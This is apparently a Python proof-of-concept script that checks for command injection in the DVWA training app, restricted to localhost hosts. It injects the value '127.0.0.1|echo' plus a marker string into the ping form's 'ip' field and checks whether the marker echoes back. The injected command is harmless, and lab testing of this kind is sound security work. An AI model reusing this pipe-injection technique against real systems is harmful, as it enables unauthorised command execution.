#!/usr/bin/env python3
'''CMD-003 草案: DVWA 命令注入无害回显验证 (仅本地授权靶场).
用法: python cmd003_poc.py --base-url http://127.0.0.1/dvwa --cookie-file cookie.txt
'''
import argparse
import sys
import urllib.error
import urllib.parse
import urllib.request

MARKER = 'CMD003_MARKER_7f3a'
LOCAL_HOSTS = ('127.0.0.1', 'localhost', '::1')


def validate_base_url(base_url):
    parsed = urllib.parse.urlparse(base_url)
    if parsed.scheme not in ('http', 'https'):
        sys.exit('仅允许 http/https')
    if parsed.hostname not in LOCAL_HOSTS:
        sys.exit('仅允许本地靶场地址')
    return base_url.rstrip('/')


def read_cookie(path):
    try:
        with open(path, 'r', encoding='utf-8') as handle:
            value = handle.read().strip()
    except OSError as exc:
        sys.exit('无法读取 cookie 文件: %s' % exc)
    if not value or '\n' in value or '\r' in value:
        sys.exit('cookie 文件应为单行 Cookie 请求头, 不写入版本库')
    return value


class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def send(opener, url, ip_value, cookie):
    payload = urllib.parse.urlencode({'Submit': 'Submit', 'ip': ip_value}).encode('utf-8')
    request = urllib.request.Request(url, data=payload, method='POST')
    request.add_header('Content-Type', 'application/x-www-form-urlencoded')
    request.add_header('Cookie', cookie)
    try:
        with opener.open(request, timeout=15) as response:
            return response.status, response.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode('utf-8', 'replace')
    except urllib.error.URLError as exc:
        sys.exit('连接失败: %s' % exc.reason)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--base-url', required=True, help='例如 http://127.0.0.1/dvwa')
    parser.add_argument('--cookie-file', required=True, help='本地单行 Cookie 头文件')
    parser.add_argument('--path', default='/vulnerabilities/exec/', help='命令注入页面路径')
    args = parser.parse_args()

    base_url = validate_base_url(args.base_url)
    cookie = read_cookie(args.cookie_file)
    url = base_url + args.path
    opener = urllib.request.build_opener(NoRedirect())

    status, body = send(opener, url, '127.0.0.1', cookie)
    print('[baseline] HTTP %s, marker=%s' % (status, MARKER in body))
    if 'login.php' in body or status in (301, 302, 303, 307, 308):
        sys.exit('会话无效或要求登录: 请更新 cookie 后重试; 该结果不能判断漏洞')

    payload = '127.0.0.1|echo ' + MARKER
    status2, body2 = send(opener, url, payload, cookie)
    hit = MARKER in body2 and MARKER not in body
    print('[test] HTTP %s, marker=%s, marker_not_in_baseline=%s' % (status2, MARKER in body2, hit))
    if '<pre>' not in body2:
        print('提示: 未看到 <pre> 输出块, 页面结构可能不同, 需人工检查响应')
    print('结果: %s' % ('观察到额外命令回显标记' if hit else '未观察到额外命令回显标记'))


if __name__ == '__main__':
    main()
